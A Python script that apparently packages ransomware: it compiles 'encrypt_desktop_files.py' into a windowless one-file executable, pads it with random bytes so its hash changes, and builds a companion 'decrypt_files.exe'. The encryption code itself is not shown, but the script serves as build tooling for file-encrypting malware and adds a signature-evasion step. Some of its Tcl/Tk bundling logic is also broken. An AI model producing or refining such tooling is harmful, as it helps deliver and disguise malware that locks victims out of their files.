import os
import shutil
import subprocess

def package_script(script_name):
    # Check if PyInstaller is installed
    try:
        import PyInstaller
    except ImportError:
        print("PyInstaller is not installed. Installing it now...")
        subprocess.check_call(['pip', 'install', 'pyinstaller'])

    # Create the command to package the encryption script
    command = f'pyinstaller --onefile --windowed {script_name}'

    # Run the command for the encryption script
    process = subprocess.Popen(command, shell=True)
    process.communicate()

    # Check if the executable was created successfully
    dist_dir = 'dist'
    if os.path.exists(dist_dir):
        executable_name = script_name.replace('.py', '.exe')
        os.rename(os.path.join(dist_dir, executable_name), executable_name)
        print(f"Executable created: {executable_name}")
        
        # Add dummy data to the final executable
        with open(executable_name, 'ab') as exe_file:
            dummy_data = os.urandom(1024)  # 1 KB of random data
            exe_file.write(dummy_data)
            print("Dummy data added to the executable")
        
        # Ensure tkinter is included in the decryption executable
        include_tk_libraries()
        
        # Run PyInstaller with the updated command to include tk
        command = f'pyinstaller --onefile --windowed decrypt_files.py'
        process = subprocess.Popen(command, shell=True)
        process.communicate()

        # Move the decryption executable to the desired location
        if os.path.exists(os.path.join(dist_dir, 'decrypt_files.exe')):
            os.rename(os.path.join(dist_dir, 'decrypt_files.exe'), 'decrypt_files.exe')
            print(f"Decryption executable moved to: decrypt_files.exe")
        else:
            print("Error: Decryption executable not found")
    else:
        print("Error: dist directory not found")

def include_tk_libraries():
    import tkinter as tk
    tcl_library = os.path.join(tk.Tk().tk.exprstring("$tcl_library"))
    tk_library = os.path.join(tk.Tk().tk.exprstring("$tk_library"))
    
    datas = [
        (tcl_library, "lib/tcl"),
        (tk_library, "lib/tk"),
    ]
    
    for src, dest in datas:
        dest_dir = os.path.join("dist", "lib", dest)
        if not os.path.exists(dest_dir):
            os.makedirs(dest_dir)
        for file in os.listdir(src):
            full_file_name = os.path.join(src, file)
            if os.path.isfile(full_file_name):
                shutil.copy(full_file_name, dest_dir)

if __name__ == "__main__":
    script_to_package = 'encrypt_desktop_files.py'
    package_script(script_to_package)
    input("Press Enter to exit...")  # Keep the console window open
